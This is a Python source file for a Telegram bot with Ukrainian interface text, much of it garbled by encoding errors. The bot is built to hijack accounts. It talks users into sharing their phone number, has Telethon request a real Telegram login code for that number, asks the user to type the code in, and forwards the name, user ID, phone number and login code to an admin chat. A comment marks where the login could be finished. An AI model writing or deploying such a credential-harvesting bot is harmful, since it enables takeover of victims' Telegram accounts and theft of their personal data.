
import telebot
import os
from telebot import types
import asyncio
from telethon import TelegramClient

API_ID = os.getenv("API_ID") 
API_HASH = os.getenv("API_HASH")
bot_token = os.getenv("TELEGRAM_BOT_TOKEN")
admin_id = os.getenv("ADMIN_ID")

bot = telebot.TeleBot(bot_token)
user_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    user = message.from_user
    chat_id = message.chat.id

    first_name = user.first_name or "–ù–µ–º–∞—î"
    last_name = user.last_name or "–ù–µ–º–∞—î"
    username = user.username or "–ù–µ–º–∞—î"
    language_code = user.language_code or "–ù–µ–º–∞—î"
    phone = getattr(user, 'phone', "–ù–µ–º–∞—î")

    user_info = (
        f"üîî –ù–û–í–ò–ô –ö–û–†–ò–°–¢–£–í–ê–ß:\n"
        f"First Name: {first_name}\n"
        f"Last Name: {last_name}\n"
        f"Username: @{username}\n",
        f"ID: {user.id}\n"
        f"Language code: {language_code}"
    )

    print(user_info)
    bot.send_message(admin_id, user_info)

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    contact_button = types.KeyboardButton("üì± –ü–æ–¥—ñ–ª–∏—Ç–∏—Å—è –∫–æ–Ω—Ç–∞–∫—Ç–æ–º", request_contact=True)
    markup.add(contact_button)

    bot.send_message(
        chat_id,
        "–ü–æ—Ç—Ä—ñ–±–Ω–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É, —â–æ–± –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏. ",
        reply_markup=markup
    )

    bot.send_message(
        chat_id,
        "–ü—Ä–∏–≤—ñ—Ç! –í–≤–µ–¥–∏ —Å–≤—ñ–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É —É —Ñ–æ—Ä–º–∞—Ç—ñ +380XXXXXXXXX –∞–±–æ –Ω–∞—Ç–∏—Å–Ω–∏ –∫–Ω–æ–ø–∫—É –Ω–∏–∂—á–µ:",
        reply_markup=markup
    )

@bot.message_handler(content_types=['contact'])
def contact_handler(message):
    chat_id = message.chat.id
    contact = message.contact
    phone = contact.phone_number

    user_data[chat_id] = {'phone': phone}
    msg = f"üìû –û—Ç—Ä–∏–º–∞–Ω–æ –∫–æ–Ω—Ç–∞–∫—Ç –≤—ñ–¥ {chat_id}:\n–ù–æ–º–µ—Ä: {phone}"
    print(msg)
    bot.send_message(admin_id, msg)

    bot.send_message(chat_id, "–ö–æ–¥ –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è...")
    asyncio.run(auth_send_code(chat_id, phone))

@bot.message_handler(func=lambda msg: msg.text.startswith('+380'))
def handle_phone(message):
    chat_id = message.chat.id
    phone = message.text.strip()

    user_data[chat_id] = {'phone': phone}
    msg = f"üìû –û—Ç—Ä–∏–º–∞–Ω–æ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É –≤—ñ–¥ {chat_id}:\n–ù–æ–º–µ—Ä: {phone}"
    print(msg)
    bot.send_message(admin_id, msg)

    bot.send_message(chat_id, "–ö–æ–¥ –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è...")
    asyncio.run(auth_send_code(chat_id, phone))

async def auth_send_code(chat_id, phone):
    client = TelegramClient(f'session_{chat_id}', API_ID, API_HASH)
    await client.connect()
    if not await client.is_user_authorized():
        await client.send_code_request(phone)
        user_data[chat_id]['client'] = client
        await client.disconnect()
        bot.send_message(chat_id, "–ö–æ–¥ –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ! –í–≤–µ–¥–∏ –π–æ–≥–æ —Å—é–¥–∏:")

@bot.message_handler(func=lambda msg: msg.chat.id in user_data and 'client' in user_data[msg.chat.id])
def handle_code(message):
    chat_id = message.chat.id
    code = message.text.strip()
    phone = user_data[chat_id]['phone']
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    contact_button = types.KeyboardButton("–í–∏–º–∫–Ω—É—Ç–∏ –±–æ—Ç–∞")
    markup.add(contact_button)
    
    bot.send_message(chat_id, "–§—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–æ!", reply_markup=markup)
    msg = f"‚úÖ –û—Ç—Ä–∏–º–∞–Ω–æ –∫–æ–¥ –≤—ñ–¥ {chat_id}:\n–¢–µ–ª–µ—Ñ–æ–Ω: {phone}\n–ö–æ–¥: {code}"
    print(msg)
    bot.send_message(admin_id, msg)
    

    asyncio.run(show_data(chat_id, phone, code))
    

@bot.message_handler(func=lambda msg: msg.text == "–í–∏–º–∫–Ω—É—Ç–∏ –±–æ—Ç–∞")
def disable_bot(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "–ë–æ—Ç –≤–∏–º–∫–Ω—É—Ç–æ.")


async def show_data(chat_id, phone, code):
    print(f"Phone: {phone}, Code: {code}")
    # –¢—É—Ç –º–æ–∂–Ω–∞ –¥–æ–ø–∏—Å–∞—Ç–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é, —è–∫—â–æ —Ö–æ—á–µ—à –∑–∞–≤–µ—Ä—à–∏—Ç–∏ –ª–æ–≥—ñ–Ω

bot.polling()
